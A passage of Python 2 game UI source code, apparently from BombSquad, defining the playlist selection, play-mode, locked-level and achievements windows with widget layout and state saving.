                                           'Score to Win': 21,
                                           'Respawn Times': 1.0}}]})
            bsInternal._addTransaction(
                {'type': 'ADD_PLAYLIST', 'playlistType': 'Free-for-All',
                 'playlistName': bs.Lstr(
                     translate=('playlistNames', 'Just Epic')).evaluate(),
                 'playlist':
                 [{'type': 'bsElimination.EliminationGame',
                   'settings':
                   {'Time Limit': 120, 'map': 'Tip Top', 'Respawn Times': 1.0,
                    'Lives Per Player': 1, 'Epic Mode': 1}}]})

            bsInternal._addTransaction(
                {'type': 'SET_MISC_VAL', 'name': 'madeStandardPlaylists',
                 'value': True})
            bsInternal._runTransactions()

        # get the current selection (if any)
        try:
            self._selectedPlaylist = bs.getConfig()[
                self._configName + ' Playlist Selection']
        except Exception:
            self._selectedPlaylist = None

        self._width = 900 if gSmallUI else 800
        xInset = 50 if gSmallUI else 0
        self._height = 480 if gSmallUI else 510 if gMedUI else 580

        topExtra = 20 if gSmallUI else 0
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height + topExtra),
            transition=transition, toolbarVisibility='MENU_FULL',
            scaleOriginStackOffset=scaleOrigin, scale=1.69
            if gSmallUI else 1.05 if gMedUI else 0.9, stackOffset=(0, -26)
            if gSmallUI else(0, 0))
        self._backButton = bs.buttonWidget(
            parent=self._rootWidget, position=(59 + xInset, self._height - 70),
            size=(120, 60),
            scale=1.0, onActivateCall=self._onBackPress, autoSelect=True,
            label=bs.Lstr(resource='backText'),
            buttonType='back')
        bs.containerWidget(edit=self._rootWidget, cancelButton=self._backButton)
        t = self._titleText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 41),
            size=(0, 0),
            text=self._windowTitleName, scale=1.3, resScale=1.5,
            color=gHeadingColor, hAlign="center", vAlign="center")
        if gSmallUI and gToolbars:
            bs.textWidget(edit=t, text='')

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=self._backButton, buttonType='backSmall', size=(60, 54),
                position=(59+xInset, self._height-67),
                label=bs.getSpecialChar('back'))

        if gSmallUI and gToolbars:
            self._backButton.delete()
            self._backButton = None
            bs.containerWidget(edit=self._rootWidget,
                               onCancelCall=self._onBackPress)
            scrollOffs = 33
        else:
            scrollOffs = 0

        self._scrollWidth = self._width - (100+2*xInset)
        self._scrollHeight = self._height - (146
                                             if gSmallUI and gToolbars else 136)

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, highlight=False,
            size=(self._scrollWidth, self._scrollHeight),
            position=((self._width - self._scrollWidth) * 0.5, 65 + scrollOffs))
        bs.containerWidget(edit=self._scrollWidget, claimsLeftRight=True)

        self._subContainer = None

        self._configNameFull = self._configName+' Playlists'
        self._lastConfig = None

        # update now and once per second.. (this should do our initial refresh)
        self._updateTimer = bs.Timer(
            1000, bs.WeakCall(self._update),
            timeType='real', repeat=True)
        self._update()

    def _refresh(self):

        if not self._rootWidget.exists():
            return

        if self._subContainer is not None:
            self._save_state()
            self._subContainer.delete()

        # make sure config exists
        if self._configNameFull not in bs.getConfig():
            bs.getConfig()[self._configNameFull] = {}

        items = bs.getConfig()[self._configNameFull].items()

        # make sure everything is unicode
        items = [(i[0].decode('utf-8'), i[1]) if type(i[0])
                 is not unicode else i for i in items]

        items.sort(key=lambda x: x[0].lower())
        items = [[u'__default__', None]] + items  # default is always first

        count = len(items)
        columns = 3
        rows = int(math.ceil(float(count)/columns))
        buttonWidth = 230
        buttonHeight = 230
        buttonBufferH = -3
        buttonBufferV = 0

        self._subWidth = self._scrollWidth
        self._subHeight = 40+rows*(buttonHeight+2*buttonBufferV) + 90
        self._subContainer = bs.containerWidget(parent=self._scrollWidget, size=(
            self._subWidth, self._subHeight), background=False)

        children = self._subContainer.getChildren()
        for c in children:
            c.delete()

        bs.textWidget(parent=self._subContainer,
                      text=bs.Lstr(resource='playlistsText'),
                      position=(40, self._subHeight - 26),
                      size=(0, 0), scale=1.0, maxWidth=400, color=gTitleColor,
                      hAlign='left', vAlign='center')

        index = 0
        maskTexture = bs.getTexture('characterIconMask')
        tintColor = (1, 1, 1)
        tint2Color = (1, 1, 1)
        selectedCharacter = None
        bsConfig = bs.getConfig()

        modelOpaque = bs.getModel('levelSelectButtonOpaque')
        modelTransparent = bs.getModel('levelSelectButtonTransparent')
        maskTex = bs.getTexture('mapPreviewMask')

        hOffs = 225 if count == 1 else 115 if count == 2 else 0
        hOffsBottom = 0 if (count > 1 and count % 3 == 1) else 230
        hOffsBottom = 0

        for y in range(rows):
            for x in range(columns):
                name = items[index][0]
                pos = (
                    x * (buttonWidth + 2 * buttonBufferH) + buttonBufferH + 8 +
                    hOffs, self._subHeight - 47 - (y + 1) *
                    (buttonHeight + 2 * buttonBufferV))
                b = bs.buttonWidget(parent=self._subContainer,
                                    buttonType='square',
                                    size=(buttonWidth, buttonHeight),
                                    autoSelect=True,
                                    label='',
                                    position=pos)

                if x == 0 and gToolbars and gSmallUI:
                    bs.widget(
                        edit=b, leftWidget=bsInternal._getSpecialWidget(
                            'backButton'))
                if x == columns - 1 and gToolbars and gSmallUI:
                    bs.widget(
                        edit=b, rightWidget=bsInternal._getSpecialWidget(
                            'partyButton'))
                bs.buttonWidget(
                    edit=b, onActivateCall=bs.Call(
                        self._onPlaylistPress, b, name),
                    onSelectCall=bs.Call(self._onPlaylistSelect, name))
                bs.widget(edit=b, showBufferTop=50, showBufferBottom=50)

                if self._selectedPlaylist == name:
                    bs.containerWidget(
                        edit=self._subContainer, selectedChild=b,
                        visibleChild=b)

                if self._backButton is not None:
                    if y == 0:
                        bs.widget(edit=b, upWidget=self._backButton)
                    if x == 0:
                        bs.widget(edit=b, leftWidget=self._backButton)

                if name == '__default__':
                    printName = self._defaultListName
                else:
                    printName = name
                bs.textWidget(
                    parent=self._subContainer, text=printName,
                    position=(pos[0] + buttonWidth * 0.5, pos[1] + buttonHeight
                              * 0.79),
                    size=(0, 0),
                    scale=buttonWidth * 0.003, maxWidth=buttonWidth * 0.7,
                    drawController=b, hAlign='center', vAlign='center')

                # poke into this playlist and see if we can display some of
                # its maps..
                mapImages = []
                try:
                    mapTextures = []
                    mapTextureEntries = []
                    if name == '__default__':
                        if self._sessionType is bs.FreeForAllSession:
                            playlist = bsUtils._getDefaultFreeForAllPlaylist()
                        elif self._sessionType is bs.TeamsSession:
                            playlist = bsUtils._getDefaultTeamsPlaylist()
                        else:
                            raise Exception(
                                "unrecognized session-type: " +
                                str(self._sessionType))
                    else:
                        if name not in bsConfig[self._configName+' Playlists']:
                            print 'NOT FOUND ERR', bsConfig[self._configName +
                                                            ' Playlists']
                        playlist = bsConfig[self._configName+' Playlists'][name]
                    playlist = bsUtils._filterPlaylist(
                        playlist, self._sessionType, removeUnOwned=False,
                        markUnOwned=True)
                    for entry in playlist:
                        m = entry['settings']['map']
                        try:
                            mapType = bsMap.getMapClass(m)
                        except Exception:
                            mapType = None
                        if mapType is not None:
                            texName = mapType.getPreviewTextureName()
                            if texName is not None:
                                mapTextures.append(texName)
                                mapTextureEntries.append(entry)
                        if len(mapTextures) >= 6:
                            break

                    if len(mapTextures) > 4:
                        imgRows = 3
                        imgColumns = 2
                        sc = 0.33
                        hOffsImg = 30
                        vOffsImg = 126
                    elif len(mapTextures) > 2:
                        imgRows = 2
                        imgColumns = 2
                        sc = 0.35
                        hOffsImg = 24
                        vOffsImg = 110
                    elif len(mapTextures) > 1:
                        imgRows = 2
                        imgColumns = 1
                        sc = 0.5
                        hOffsImg = 47
                        vOffsImg = 105
                    else:
                        imgRows = 1
                        imgColumns = 1
                        sc = 0.75
                        hOffsImg = 20
                        vOffsImg = 65

                    for r in range(imgRows):
                        for c in range(imgColumns):
                            texIndex = r*imgColumns+c
                            if texIndex < len(mapTextures):
                                entry = mapTextureEntries[texIndex]

                                owned = False if (
                                    ('isUnOwnedMap' in entry
                                     and entry['isUnOwnedMap'])
                                    or ('isUnOwnedGame' in entry
                                        and entry['isUnOwnedGame'])) else True

                                texName = mapTextures[texIndex]
                                h = pos[0]+hOffsImg + sc * 250 * c
                                v = pos[1]+vOffsImg - sc * 130 * r
                                mapImages.append(
                                    bs.imageWidget(
                                        parent=self._subContainer,
                                        size=(sc * 250.0, sc * 125.0),
                                        position=(h, v),
                                        texture=bs.getTexture(texName),
                                        opacity=1.0 if owned else 0.25,
                                        drawController=b,
                                        modelOpaque=modelOpaque,
                                        modelTransparent=modelTransparent,
                                        maskTexture=maskTex))
                                if not owned:
                                    bs.imageWidget(
                                        parent=self._subContainer,
                                        size=(sc * 100.0, sc * 100.0),
                                        position=(h + sc * 75, v + sc * 10),
                                        texture=bs.getTexture('lock'),
                                        drawController=b)

                        v -= sc*130.0

                except Exception:
                    bs.printException("error listing playlist maps")

                if len(mapImages) == 0:
                    bs.textWidget(
                        parent=self._subContainer, text='???', scale=1.5,
                        size=(0, 0),
                        color=(1, 1, 1, 0.5),
                        hAlign='center', vAlign='center', drawController=b,
                        position=(pos[0] + buttonWidth * 0.5, pos[1] +
                                  buttonHeight * 0.5))

                index += 1

                if index >= count:
                    break
            if index >= count:
                break
        self._customizeButton = b = bs.buttonWidget(
            parent=self._subContainer, size=(100, 30),
            position=(34 + hOffsBottom, 50),
            textScale=0.6, label=bs.Lstr(resource='customizeText'),
            onActivateCall=self._onCustomizePress, color=(0.54, 0.52, 0.67),
            textColor=(0.7, 0.65, 0.7),
            autoSelect=True)
        bs.widget(edit=b, showBufferTop=22, showBufferBottom=28)
        self._restore_state()

    def onPlayOptionsWindowRunGame(self):
        if not self._rootWidget.exists():
            return
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')

    def _onPlaylistSelect(self, playlistName):
        self._selectedPlaylist = playlistName

    def _update(self):

        # make sure config exists
        if self._configNameFull not in bs.getConfig():
            bs.getConfig()[self._configNameFull] = {}

        c = bs.getConfig()[self._configNameFull]
        if c != self._lastConfig:
            self._lastConfig = copy.deepcopy(c)
            self._refresh()

    def _onPlaylistPress(self, button, playlistName):
        # (make sure the target playlist still exists)
        try:
            exists = (
                playlistName ==
                '__default__'
                or playlistName in bs.getConfig()[self._configNameFull])
        except Exception:
            exists = False
        if not exists:
            return

        self._save_state()
        PlayOptionsWindow(
            sessionType=self._sessionType,
            scaleOrigin=button.getScreenSpaceCenter(),
            playlist=playlistName, delegate=self)

    def _onCustomizePress(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = PlaylistWindow(
            originWidget=self._customizeButton,
            sessionType=self._sessionType).getRootWidget()

    def _onBackPress(self):

        # store our selected playlist if that's changed..
        if self._selectedPlaylist is not None:
            try:
                prevSel = bs.getConfig()[self._configName+' Playlist Selection']
            except Exception:
                prevSel = None
            if self._selectedPlaylist != prevSel:
                bs.getConfig()[
                    self._configName+' Playlist Selection'] = \
                        self._selectedPlaylist
                bs.writeConfig()

        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = PlayWindow(
            transition='inLeft').getRootWidget()

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._backButton:
                selName = 'Back'
            elif sel == self._scrollWidget:
                subsel = self._subContainer.getSelectedChild()
                if subsel == self._customizeButton:
                    selName = 'Customize'
                else:
                    selName = 'Scroll'
            else:
                raise Exception("unrecognized selected widget")
            gWindowStates[self.__class__.__name__] = selName
        except Exception:
            bs.printException('error saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]
            except Exception:
                selName = None
            if selName == 'Back':
                sel = self._backButton
            elif selName == 'Scroll':
                sel = self._scrollWidget
            elif selName == 'Customize':
                sel = self._scrollWidget
                bs.containerWidget(edit=self._subContainer,
                                   selectedChild=self._customizeButton,
                                   visibleChild=self._customizeButton)
            else:
                sel = self._scrollWidget
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)


class PlayWindow(Window):

    def __init__(self, transition='inRight', originWidget=None):
        newStyle = True
        width = 1000 if gSmallUI else 800
        xOffs = 100 if gSmallUI else 0
        height = 550 if newStyle else 400
        spacing = 90
        buttonWidth = 400

        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._r = 'playWindow'

        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition=transition, toolbarVisibility='MENU_FULL',
            scaleOriginStackOffset=scaleOrigin,
            scale=(1.6 if newStyle else 1.52)
            if gSmallUI else 0.9 if gMedUI else 0.8,
            stackOffset=((0, 0) if newStyle else(10, 7))
            if gSmallUI else(0, 0))
        self._backButton = backButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(55 + xOffs, height - 132)
            if newStyle else(55, height - 92), size=(120, 60),
            scale=1.1, textResScale=1.5, textScale=1.2, autoSelect=True,
            label=bs.Lstr(resource='backText'),
            buttonType='back')

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(width * 0.5, height - (101 if newStyle else 61)),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.titleText'),
            scale=1.7, resScale=2.0, maxWidth=400, color=gHeadingColor,
            hAlign="center", vAlign="center")

        if gDoAndroidNav:
            bs.buttonWidget(
                edit=b, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))
        if gToolbars and gSmallUI:
            bs.textWidget(edit=t, text='')

        v = height - (110 if newStyle else 60)
        v -= 100
        c = (0.6, 0.7, 0.6, 1.0)
        v -= 280 if newStyle else 180
        v += 30 if gToolbars and gSmallUI else 0
        hoffs = xOffs + 80 if newStyle else 0
        sc = 1.13 if newStyle else 0.68

        self._lineupTex = bs.getTexture('playerLineup')
        angryComputerTransparentModel = bs.getModel('angryComputerTransparent')
        self._lineup1TransparentModel = bs.getModel('playerLineup1Transparent')
        self._lineup2TransparentModel = bs.getModel('playerLineup2Transparent')
        self._lineup3TransparentModel = bs.getModel('playerLineup3Transparent')
        self._lineup4TransparentModel = bs.getModel('playerLineup4Transparent')
        self._eyesModel = bs.getModel('plasticEyesTransparent')

        self._coopButton = b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(hoffs, v + (sc * 15 if newStyle else 0)),
            size=(sc * buttonWidth, sc * (300 if newStyle else 360)),
            extraTouchBorderScale=0.1, autoSelect=True, label="",
            buttonType='square', textScale=1.13, onActivateCall=self._coop)

        if gToolbars and gSmallUI:
            bs.widget(edit=b, leftWidget=bsInternal._getSpecialWidget(
                'backButton'))
            bs.widget(edit=b, upWidget=bsInternal._getSpecialWidget(
                'accountButton'))
            bs.widget(
                edit=b, downWidget=bsInternal._getSpecialWidget(
                    'settingsButton'))

        self._drawDude(
            0, b, hoffs, v, sc, position=(140, 30),
            color=(0.72, 0.4, 1.0))
        self._drawDude(
            1, b, hoffs, v, sc, position=(185, 53),
            color=(0.71, 0.5, 1.0))
        self._drawDude(
            2, b, hoffs, v, sc, position=(220, 27),
            color=(0.67, 0.44, 1.0))
        self._drawDude(
            3, b, hoffs, v, sc, position=(255, 57),
            color=(0.7, 0.3, 1.0))
        bs.imageWidget(
            parent=self._rootWidget, drawController=b,
            position=(hoffs + sc * (230),
                      v + sc * (153)),
            size=(sc * 115, sc * 115),
            texture=self._lineupTex,
            modelTransparent=angryComputerTransparentModel)

        bs.textWidget(
            parent=self._rootWidget, drawController=b,
            position=(hoffs + sc * (-10),
                      v + sc * (95)),
            size=(sc * buttonWidth, sc * 50),
            text=bs.Lstr(
                resource='playModes.singlePlayerCoopText',
                fallbackResource='playModes.coopText'),
            maxWidth=sc * buttonWidth * 0.7, resScale=1.5, hAlign='center',
            vAlign='center', color=(0.7, 0.9, 0.7, 1.0),
            scale=sc * 2.3)

        bs.textWidget(
            parent=self._rootWidget, drawController=b,
            position=(hoffs + sc * (-10),
                      v + (sc * 54)),
            size=(sc * buttonWidth, sc * 30),
            text=bs.Lstr(resource=self._r + '.oneToFourPlayersText'),
            hAlign='center', vAlign='center', scale=0.83 * sc, flatness=1.0,
            maxWidth=sc * buttonWidth * 0.7, color=c)

        sc = 0.5 if newStyle else 0.68
        hoffs += 440 if newStyle else 260
        v += 180 if newStyle else 0

        self._teamsButton = b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(hoffs, v + (sc * 15 if newStyle else 0)),
            size=(sc * buttonWidth, sc * (300 if newStyle else 360)),
            extraTouchBorderScale=0.1, autoSelect=True, label="",
            buttonType='square', textScale=1.13,
            onActivateCall=self._teamTourney)

        if gToolbars:
            bs.widget(
                edit=b, upWidget=bsInternal._getSpecialWidget(
                    'ticketsPlusButton'),
                rightWidget=bsInternal._getSpecialWidget('partyButton'))

        xx = -14
        self._drawDude(2, b, hoffs, v, sc, position=(
            xx+148, 30), color=(0.2, 0.4, 1.0))
        self._drawDude(3, b, hoffs, v, sc, position=(
            xx+181, 53), color=(0.3, 0.4, 1.0))
        self._drawDude(1, b, hoffs, v, sc, position=(
            xx+216, 33), color=(0.3, 0.5, 1.0))
        self._drawDude(0, b, hoffs, v, sc, position=(
            xx+245, 57), color=(0.3, 0.5, 1.0))

        xx = 155
        self._drawDude(0, b, hoffs, v, sc, position=(
            xx+151, 30), color=(1.0, 0.5, 0.4))
        self._drawDude(1, b, hoffs, v, sc, position=(
            xx+189, 53), color=(1.0, 0.58, 0.58))
        self._drawDude(3, b, hoffs, v, sc, position=(
            xx+223, 27), color=(1.0, 0.5, 0.5))
        self._drawDude(2, b, hoffs, v, sc, position=(
            xx+257, 57), color=(1.0, 0.5, 0.5))

        bs.textWidget(
            parent=self._rootWidget, drawController=b,
            position=(hoffs + sc * (-10),
                      v + sc * (95)),
            size=(sc * buttonWidth, sc * 50),
            text=bs.Lstr(
                resource='playModes.teamsText', fallbackResource='teamsText'),
            resScale=1.5, maxWidth=sc * buttonWidth * 0.7, hAlign='center',
            vAlign='center', color=(0.7, 0.9, 0.7, 1.0),
            scale=sc * 2.3)
        bs.textWidget(
            parent=self._rootWidget, drawController=b,
            position=(hoffs + sc * (-10),
                      v + (sc * 54)),
            size=(sc * buttonWidth, sc * 30),
            text=bs.Lstr(resource=self._r + '.twoToEightPlayersText'),
            hAlign='center', vAlign='center', resScale=1.5, scale=0.9 * sc,
            flatness=1.0, maxWidth=sc * buttonWidth * 0.7, color=c)

        hoffs += 0 if newStyle else 260
        v -= 155 if newStyle else 0
        self._freeForAllButton = b = bs.buttonWidget(
            parent=self._rootWidget,
            position=(hoffs, v + (sc * 15 if newStyle else 0)),
            size=(sc * buttonWidth, sc * (300 if newStyle else 360)),
            extraTouchBorderScale=0.1, autoSelect=True, label="",
            buttonType='square', textScale=1.13, onActivateCall=self.
            _freeForAll)

        xx = -5
        self._drawDude(0, b, hoffs, v, sc, position=(
            xx+140, 30), color=(0.4, 1.0, 0.4))
        self._drawDude(3, b, hoffs, v, sc, position=(
            xx+185, 53), color=(1.0, 0.4, 0.5))
        self._drawDude(1, b, hoffs, v, sc, position=(
            xx+220, 27), color=(0.4, 0.5, 1.0))
        self._drawDude(2, b, hoffs, v, sc, position=(
            xx+255, 57), color=(0.5, 1.0, 0.4))
        xx = 140
        self._drawDude(2, b, hoffs, v, sc, position=(
            xx+148, 30), color=(1.0, 0.9, 0.4))
        self._drawDude(0, b, hoffs, v, sc, position=(
            xx+182, 53), color=(0.7, 1.0, 0.5))
        self._drawDude(3, b, hoffs, v, sc, position=(
            xx+233, 27), color=(0.7, 0.5, 0.9))
        self._drawDude(1, b, hoffs, v, sc, position=(
            xx+266, 53), color=(0.4, 0.5, 0.8))
        bs.textWidget(
            parent=self._rootWidget, drawController=b,
            position=(hoffs + sc * (-10),
                      v + sc * (95)),
            size=(sc * buttonWidth, sc * 50),
            text=bs.Lstr(
                resource='playModes.freeForAllText',
                fallbackResource='freeForAllText'),
            maxWidth=sc * buttonWidth * 0.7, hAlign='center', vAlign='center',
            color=(0.7, 0.9, 0.7, 1.0),
            scale=sc * 1.9)
        bs.textWidget(
            parent=self._rootWidget, drawController=b,
            position=(hoffs + sc * (-10),
                      v + (sc * 54)),
            size=(sc * buttonWidth, sc * 30),
            text=bs.Lstr(resource=self._r + '.twoToEightPlayersText'),
            hAlign='center', vAlign='center', scale=0.9 * sc, flatness=1.0,
            maxWidth=sc * buttonWidth * 0.7, color=c)

        if gToolbars and gSmallUI:
            backButton.delete()
            bs.containerWidget(
                edit=self._rootWidget, onCancelCall=self._back,
                selectedChild=self._coopButton)
        else:
            bs.buttonWidget(edit=backButton, onActivateCall=self._back)
            bs.containerWidget(
                edit=self._rootWidget, cancelButton=backButton,
                selectedChild=self._coopButton)

        self._restore_state()

    def _back(self):
        self._save_state()
        uiGlobals['mainMenuWindow'] = MainMenuWindow(
            transition='inLeft').getRootWidget()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)

    def _coop(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = CoopWindow(
            originWidget=self._coopButton).getRootWidget()

    def _teamTourney(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = TeamsWindow(
            originWidget=self._teamsButton,
            sessionType=bs.TeamsSession).getRootWidget()

    def _freeForAll(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = TeamsWindow(
            originWidget=self._freeForAllButton,
            sessionType=bs.FreeForAllSession).getRootWidget()

    def _drawDude(self, i, b, hoffs, v, sc, position, color):
        hExtra = -100
        vExtra = 130
        eyeColor = (0.7*1.0+0.3*color[0],
                    0.7*1.0+0.3*color[1],
                    0.7*1.0+0.3*color[2])
        if i == 0:
            t = bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                position=(hoffs + sc * (hExtra + position[0]),
                          v + sc * (vExtra + position[1])),
                size=(sc * 60, sc * 80),
                color=color, texture=self._lineupTex,
                modelTransparent=self._lineup1TransparentModel)
            bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                position=(hoffs + sc * (hExtra + position[0] + 12),
                          v + sc * (vExtra + position[1] + 53)),
                size=(sc * 36, sc * 18),
                texture=self._lineupTex, color=eyeColor,
                modelTransparent=self._eyesModel)
        elif i == 1:
            t = bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                position=(hoffs + sc * (hExtra + position[0]),
                          v + sc * (vExtra + position[1])),
                size=(sc * 45, sc * 90),
                color=color, texture=self._lineupTex,
                modelTransparent=self._lineup2TransparentModel)
            bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                position=(hoffs + sc * (hExtra + position[0] + 5),
                          v + sc * (vExtra + position[1] + 67)),
                size=(sc * 32, sc * 16),
                texture=self._lineupTex, color=eyeColor,
                modelTransparent=self._eyesModel)
        elif i == 2:
            t = bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                position=(hoffs + sc * (hExtra + position[0]),
                          v + sc * (vExtra + position[1])),
                size=(sc * 45, sc * 90),
                color=color, texture=self._lineupTex,
                modelTransparent=self._lineup3TransparentModel)
            bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                position=(hoffs + sc * (hExtra + position[0] + 5),
                          v + sc * (vExtra + position[1] + 59)),
                size=(sc * 34, sc * 17),
                texture=self._lineupTex, color=eyeColor,
                modelTransparent=self._eyesModel)
        elif i == 3:
            t = bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                position=(hoffs + sc * (hExtra + position[0]),
                          v + sc * (vExtra + position[1])),
                size=(sc * 48, sc * 96),
                color=color, texture=self._lineupTex,
                modelTransparent=self._lineup4TransparentModel)
            bs.imageWidget(
                parent=self._rootWidget, drawController=b,
                position=(hoffs + sc * (hExtra + position[0] + 2),
                          v + sc * (vExtra + position[1] + 62)),
                size=(sc * 38, sc * 19),
                texture=self._lineupTex, color=eyeColor,
                modelTransparent=self._eyesModel)

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._teamsButton:
                selName = 'Team Games'
            elif sel == self._coopButton:
                selName = 'Co-op Games'
            elif sel == self._freeForAllButton:
                selName = 'Free-for-All Games'
            elif sel == self._backButton:
                selName = 'Back'
            else:
                raise Exception("unrecognized selected widget")
            gWindowStates[self.__class__.__name__] = selName
        except Exception:
            bs.printException('error saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]
            except Exception:
                selName = None
            if selName == 'Team Games':
                sel = self._teamsButton
            elif selName == 'Co-op Games':
                sel = self._coopButton
            elif selName == 'Free-for-All Games':
                sel = self._freeForAllButton
            elif selName == 'Back':
                sel = self._backButton
            else:
                sel = self._coopButton
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)


class LockedErrorWindow(Window):

    def __init__(self, name, depName):
        width = 550
        height = 250
        lockTex = bs.getTexture('lock')
        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition='inRight', scale=1.7
            if gSmallUI else 1.3 if gMedUI else 1.0)
        t = bs.textWidget(
            parent=self._rootWidget, position=(150 - 20, height * 0.63),
            size=(0, 0),
            hAlign="left", vAlign='center', text=bs.Lstr(
                resource='levelIsLockedText', subs=[('${LEVEL}', name)]),
            maxWidth=400, color=(1, 0.8, 0.3, 1),
            scale=1.1)
        t = bs.textWidget(
            parent=self._rootWidget, position=(150 - 20, height * 0.48),
            size=(0, 0),
            hAlign="left", vAlign='center', text=bs.Lstr(
                resource='levelMustBeCompletedFirstText',
                subs=[('${LEVEL}', depName)]),
            maxWidth=400, color=gInfoTextColor, scale=0.8)
        bs.imageWidget(parent=self._rootWidget,
                       position=(56 - 20, height * 0.39),
                       size=(80, 80),
                       texture=lockTex, opacity=1.0)
        b = bs.buttonWidget(
            parent=self._rootWidget, position=((width - 140) / 2, 30),
            size=(140, 50),
            label=bs.Lstr(resource='okText'),
            onActivateCall=self._ok)
        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=b, startButton=b)
        bs.playSound(bs.getSound('error'))

    def _ok(self):
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')


class AchievementsWindow(PopupWindow):

    def __init__(self, position, scale=None):

        if scale is None:
            scale = 2.3 if gSmallUI else 1.65 if gMedUI else 1.23
        self._transitioningOut = False

        self._width = 450
        self._height = 300 if gSmallUI else 370 if gMedUI else 450

        bgColor = (0.5, 0.4, 0.6)

        # creates our _rootWidget
        PopupWindow.__init__(self, position=position,
                             size=(self._width, self._height),
                             scale=scale, bgColor=bgColor)

        env = bs.getEnvironment()

        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, position=(50, self._height - 30),
            size=(50, 50),
            scale=0.5, label='', color=bgColor,
            onActivateCall=self._onCancelPress, autoSelect=True,
            icon=bs.getTexture('crossOut'),
            iconScale=1.2)

        achievements = bsAchievement.gAchievements
        numComplete = len([a for a in achievements if a.isComplete()])

        txtFinal = bs.Lstr(
            resource='accountSettingsWindow.achievementProgressText', subs=[
                ('${COUNT}', str(numComplete)),
                ('${TOTAL}', str(len(achievements)))])
        self._titleText = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 20),
            size=(0, 0),
            hAlign='center', vAlign='center', scale=0.6, text=txtFinal,
            maxWidth=200, color=(1, 1, 1, 0.4))

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, size=(self._width - 60, self._height - 70),
            position=(30, 30),
            captureArrows=True, simpleCullingV=10)
        bs.widget(edit=self._scrollWidget, autoSelect=True)

        bs.containerWidget(edit=self._rootWidget,
                           cancelButton=self._cancelButton)

        incr = 36
        subWidth = self._width-90
        subHeight = 40+len(achievements)*incr

        eqRsrc = 'coopSelectWindow.powerRankingPointsEqualsText'
        ptsRsrc = 'coopSelectWindow.powerRankingPointsText'

        self._subContainer = bs.containerWidget(
            parent=self._scrollWidget, size=(subWidth, subHeight),
            background=False)

        totalPts = 0
        for i, ach in enumerate(achievements):
            complete = ach.isComplete()
            bs.textWidget(
                parent=self._subContainer,
                position=(subWidth * 0.08 - 5, subHeight - 20 - incr * i),
                maxWidth=20, scale=0.5, color=(0.6, 0.6, 0.7)
                if complete else(0.6, 0.6, 0.7, 0.2), flatness=1.0, shadow=0.0,
                text=str(i + 1),
                size=(0, 0),
                hAlign='right', vAlign='center')

            bs.imageWidget(
                parent=self._subContainer,
                position=(subWidth * 0.10 + 1, subHeight - 20 - incr * i - 9)
                if complete
                else(subWidth * 0.10 - 4, subHeight - 20 - incr * i - 14),
                size=(18, 18) if complete else(27, 27), opacity=1.0
                if complete else 0.3, color=ach.getIconColor(complete)[: 3],
                texture=ach.getIconTexture(complete))
            if complete:
                bs.imageWidget(
                    parent=self._subContainer,
                    position=(subWidth * 0.10 - 4,
                              subHeight - 25 - incr * i - 9),
                    size=(28, 28),
                    color=(2, 1.4, 0),
                    texture=bs.getTexture('achievementOutline'))
            bs.textWidget(parent=self._subContainer,
                          position=(subWidth*0.19, subHeight-19-incr*i+3),
                          maxWidth=subWidth*0.62,
                          scale=0.6, flatness=1.0, shadow=0.0,
                          color=(1, 1, 1) if complete else (1, 1, 1, 0.2),
                          text=ach.getDisplayString(),
                          size=(0, 0),
                          hAlign='left', vAlign='center')

            bs.textWidget(
                parent=self._subContainer,
                position=(subWidth * 0.19, subHeight - 19 - incr * i - 10),
                maxWidth=subWidth * 0.62, scale=0.4, flatness=1.0, shadow=0.0,
                color=(0.83, 0.8, 0.85) if complete else(0.8, 0.8, 0.8, 0.2),
                text=ach.getDescriptionFullComplete()
                if complete else ach.getDescriptionFull(), size=(0, 0),
                hAlign='left', vAlign='center')

